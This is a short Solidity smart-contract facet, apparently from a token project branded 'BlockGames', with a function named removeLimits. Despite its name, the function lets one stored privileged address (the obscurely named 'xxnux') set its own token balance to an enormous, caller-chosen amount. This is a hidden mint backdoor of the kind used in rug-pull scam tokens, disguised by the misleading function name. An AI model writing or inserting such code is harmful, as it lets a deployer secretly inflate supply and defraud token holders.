/*  
   * SPDX-License-Identifier: MIT

     // Telegram: https://t.me/playernetwork
    // Twitter: https://twitter.com/GetBlockGames
    // Website: https://blockgames.com/
    // Github: https://github.com/blockgames
    // Discord: https://discord.com/invite/blockgames
    // Medium: https://medium.com/@Blockgames.com/
*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
